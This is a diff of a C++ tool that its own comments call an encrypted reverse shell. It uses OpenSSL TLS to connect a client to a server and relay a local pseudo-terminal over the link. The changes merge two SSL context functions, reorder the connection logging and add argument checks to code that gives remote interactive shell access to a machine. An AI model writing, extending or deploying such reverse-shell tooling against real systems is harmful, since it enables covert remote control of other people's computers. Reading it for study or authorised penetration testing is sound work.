@@ -9,19 +9,7 @@ std::string failedToOpenClientSoc = "[!] Failed to create client socket!";
 std::string serverDisconnected = "[!] Server Disconnected!";
 std::string failedToAcceptClient = "[!] Failed to accept incoming connection!";
 
-SSL_CTX* createServerCtx() {
-    // https://docs.openssl.org/master/man3/SSL_CTX_new/#synopsis
-    const SSL_METHOD *method = TLS_method(); // setting cipher/algorithm to be used (in this case the server ssl)
-    SSL_CTX* ctx = SSL_CTX_new(method);
-
-    if (!ctx) {
-        ERR_print_errors_fp(stderr);
-        exit(EXIT_FAILURE);
-    }
-    return ctx;
-}
-
-SSL_CTX* createClientContext() {
+SSL_CTX* createSSLCtx() {
     // https://docs.openssl.org/master/man3/SSL_CTX_new/#synopsis
     const SSL_METHOD *method = TLS_method(); // setting cipher/algorithm to be used (in this case the server ssl)
     SSL_CTX* ctx = SSL_CTX_new(method);
@@ -78,7 +66,13 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
 
     int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
 
-    SSL_CTX* ctx = createServerCtx();
+    // get some info for server user
+    struct sockaddr_in *s = (struct sockaddr_in *)&clientAddr;
+    int clientPort = ntohs(s->sin_port); // converts byte to port number
+    inet_ntop(AF_INET, &s->sin_addr, clientIpAddr, sizeof clientIpAddr); // get readable ipv4 addr
+    std::cout << "[+] Connection Received from: " << clientIpAddr << " On Port: " << clientPort << std::endl;
+
+    SSL_CTX* ctx = createSSLCtx();
     configureServerCtx(ctx);
 
     SSL* ssl = SSL_new(ctx);
@@ -87,19 +81,13 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
     if (SSL_accept(ssl) <= 0) {
         ERR_print_errors_fp(stderr);
     } else {
-        std::cout << "[+] TLS handshake successful!" << std::endl;
+        std::cout << "[+] TLS handshake successful!\n" << std::endl;
     }
 
     // check we were able to accept connection from client
     if (clientSocket < 0) {
         safeShutdown(failedToAcceptClient, serverSocket, clientSocket, ssl, ctx);
     }
-
-    // get some info for server user
-    struct sockaddr_in *s = (struct sockaddr_in *)&clientAddr;
-    int clientPort = ntohs(s->sin_port); // converts byte to port number
-    inet_ntop(AF_INET, &s->sin_addr, clientIpAddr, sizeof clientIpAddr); // get readable ipv4 addr
-    std::cout << "[+] Connection Received from: " << clientIpAddr << " On Port: " << clientPort << std::endl;
 
     fd_set fdSet;
     char ttyBuffer[4096];
@@ -183,7 +171,7 @@ void client(const std::string &ipAddr, unsigned int portNum) {
     // as of openssl 1.1.0, openssl can allocate all resources required (error strings, etc)
     OPENSSL_init_ssl(0, NULL);
 
-    SSL_CTX* ctx = createClientContext();
+    SSL_CTX* ctx = createSSLCtx();
     SSL* ssl = SSL_new(ctx);
     //https://docs.openssl.org/master/man3/SSL_set_fd/
     // "bind" to socket, or set ssl fd to socket input/output
@@ -231,6 +219,7 @@ void client(const std::string &ipAddr, unsigned int portNum) {
             write(masterFd, ttyBuffer, bytesReceived);
         }
 
+        // from tty to server
         if (FD_ISSET(masterFd, &fds)) {
             // read input from local chell
             ssize_t n = read(masterFd, ttyBuffer, sizeof(ttyBuffer));
@@ -265,6 +254,11 @@ int main(int argc, char *argv[]) {
      *  then connect and set up an encrypted rev shell (using OpenSSL TLS, Typically 1.2)
      */
     struct config cfg = parse_args(argc, argv);
+
+    // check if parser worked
+    if (cfg.execType.empty() || cfg.portNum == NULL || cfg.ipAddr.empty()) {
+        exit(-1);
+    }
 
     if (cfg.execType == "server") {
         server(cfg.ipAddr, cfg.portNum);
